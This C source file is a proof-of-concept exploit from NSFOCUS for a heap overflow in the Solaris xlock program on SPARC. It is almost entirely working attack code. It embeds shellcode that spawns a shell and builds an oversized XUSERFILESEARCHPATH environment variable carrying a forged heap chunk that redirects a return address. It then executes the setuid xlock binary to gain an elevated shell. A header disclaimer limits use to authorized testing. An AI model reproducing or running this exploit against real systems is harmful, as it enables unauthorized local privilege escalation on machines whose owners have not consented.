/*
 *  sol_sparc_xlockex.c - Proof of Concept Code for xlock heap overflow bug.
 *  Copyright (c) 2001 - Nsfocus.com
 *
 *  Tested in Solaris 2.6/7/8 SPARC
 *
 *  DISCLAIMS:
 *  This  is a proof of concept code.  This code is for test purpose 
 *  only and should not be run against any host without permission from 
 *  the system administrator.
 * 
 *  NSFOCUS Security Team <security@nsfocus.com>
 *  http://www.nsfocus.com
 */
 
#include <stdio.h>
#include <stdlib.h>
#include <sys/systeminfo.h>

#define RETLOC  0xffbee8c4  /* default "return address" location (Solaris 7) */
#define SP      0xffbefffc  /* default "bottom" stack address (Solaris 7/8) */

#define VULPROG "/usr/openwin/bin/xlock"

#define NOP     0xaa1d4015      /* "xor %l5, %l5, %l5" */


char            shellcode[] =           /* from scz's shellcode for SPARC */
"\x20\xbf\xff\xff\x20\xbf\xff\xff\x7f\xff\xff\xff\xaa\x1d\x40\x15"  
"\x81\xc3\xe0\x14\xaa\x1d\x40\x15\xaa\x1d\x40\x15\x90\x08\x3f\xff"
"\x82\x10\x20\x8d\x91\xd0\x20\x08\x90\x08\x3f\xff\x82\x10\x20\x17"
"\x91\xd0\x20\x08\x20\x80\x49\x73\x20\x80\x62\x61\x20\x80\x73\x65"
"\x20\x80\x3a\x29\x7f\xff\xff\xff\x94\x1a\x80\x0a\x90\x03\xe0\x34"
"\x92\x0b\x80\x0e\x9c\x03\xa0\x08\xd0\x23\xbf\xf8\xc0\x23\xbf\xfc"
"\xc0\x2a\x20\x07\x82\x10\x20\x3b\x91\xd0\x20\x08\x90\x1b\xc0\x0f"
"\x82\x10\x20\x01\x91\xd0\x20\x08\x2f\x62\x69\x6e\x2f\x73\x68\xff";

/* get current stack point address */
long
get_sp(void)
{
        __asm__("mov %sp,%i0");
}

long 
get_shelladdr(long sp_addr, char **arg, char **env)
{
        long            retaddr;
        int             i;
        char            plat[256];
        char            pad = 0, pad1;
        int             env_len, arg_len, len;


        /* calculate the length of "VULPROG" + argv[] */
        for (i = 0, arg_len = 0; arg[i]!=NULL ; i++) {
                arg_len += strlen(arg[i]) + 1;
        }

        
        /* calculate the pad nummber . */
        pad = 3 - arg_len % 4;
        printf("shellcode address padding = %d\n", pad);

        memset(env[0], 'A', pad);
        env[0][pad] = '\0';

                /* get environ length */
        for (i = 0, env_len = 0; env[i]!=NULL; i++) {
                env_len += strlen(env[i]) + 1;
        }

        /* get platform info  */
        sysinfo(SI_PLATFORM, plat, 256);

        len = arg_len + env_len + strlen(plat) + 1 + strlen(VULPROG) + 1;
        printf("stack arguments len = %#x(%d)\n", len, len);

        pad1 = len % 4;

        if(pad1 == 3 ) pad1 = 5;
        else pad1 = 4 - pad1;

        printf("the padding zeros number = %d\n\n", pad1);

        /* get the exact shellcode address */
        retaddr = sp_addr - pad1       /* the trailing zero number */
                          - strlen(VULPROG) - 1 
                          - strlen(plat) - 1 ;

        for(i--;i>0;i--) retaddr -= strlen(env[i]) + 1;                

        printf("Using RET address = 0x%x\n", retaddr);
        return retaddr;

} /* End of get_shelladdr */


int 
main(int argc, char **argv)
{
        char            buf[2048], fake_chunk[48];
        long            retaddr, sp_addr = SP;
        char           *arg[24], *env[24];
        char            padding[64];
        long            retloc = RETLOC;
        unsigned int   *ptr;
        char            ev1[]="XUSERFILESEARCHPATH=";
        long            ev1_len;
        long            overbuflen = 1024;

        if (argc > 1) /* you need adjust retloc offset in your system */
                retloc += atoi(argv[1]);

        arg[0] = VULPROG;
        arg[1] = NULL;

        bzero(buf, sizeof(buf));
        ev1_len = strlen(ev1);
        memcpy(buf, ev1, ev1_len);
        memset(buf + ev1_len, 'A', overbuflen + sizeof(fake_chunk));
        
        env[0] = padding;       /* put padding buffer in env */
        env[1] = shellcode;     /* put shellcode in env */
        env[2] = buf;           /* put overflow environ */    
        env[3] = NULL;          /* end of env */

        /* get stack "bottom" address */
        if(((unsigned char) (get_sp() >> 24)) == 0xef) { /* Solaris 2.6 */
          sp_addr = SP - 0x0fbf0000; 
          retloc -= 0x0fbf0000;
        }

        retaddr = get_shelladdr(sp_addr, arg, env);
        printf("Using retloc = 0x%x \n", retloc);
        
        memset(fake_chunk, '\xff', sizeof(fake_chunk));
        ptr = (unsigned int *) fake_chunk;
        *(ptr + 0) = 0xfffffff9;
        *(ptr + 2) = retaddr - 8;
        *(ptr + 8) = retloc - 8;

        memcpy(buf + ev1_len + overbuflen, fake_chunk, sizeof(fake_chunk));

        execve(VULPROG, arg, env);
        perror("execle");
}  /* End of main */